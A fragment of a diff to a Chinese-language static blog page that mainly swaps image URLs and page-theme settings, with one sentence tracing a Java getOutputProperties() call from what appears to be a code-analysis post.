+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&amp;display=inline&amp;height=382&amp;margin=%5Bobject%20Object%5D&amp;originHeight=382&amp;originWidth=1279&amp;size=0&amp;status=done&amp;style=none&amp;width=1279"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&amp;display=inline&amp;height=382&amp;margin=%5Bobject%20Object%5D&amp;originHeight=382&amp;originWidth=1279&amp;size=0&amp;status=done&amp;style=none&amp;width=1279, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&amp;display=inline&amp;height=382&amp;margin=%5Bobject%20Object%5D&amp;originHeight=382&amp;originWidth=1279&amp;size=0&amp;status=done&amp;style=none&amp;width=1279 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&amp;display=inline&amp;height=382&amp;margin=%5Bobject%20Object%5D&amp;originHeight=382&amp;originWidth=1279&amp;size=0&amp;status=done&amp;style=none&amp;width=1279 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&amp;display=inline&amp;height=382&amp;margin=%5Bobject%20Object%5D&amp;originHeight=382&amp;originWidth=1279&amp;size=0&amp;status=done&amp;style=none&amp;width=1279"
         title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&amp;amp;display=inline&amp;amp;height=382&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=382&amp;amp;originWidth=1279&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1279" /></p>
 <p>跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：</p>
 <p><img
@@ -1646,5 +1653,5 @@
             </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                 <i class="fas fa-comment fa-fw"></i>
             </a>
-        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"data":{"id-1":"Nmk","id-2":"Nmk"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":" $","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":300}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"data":{"id-1":"NMK","id-2":"NMK"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":" $","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":300}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
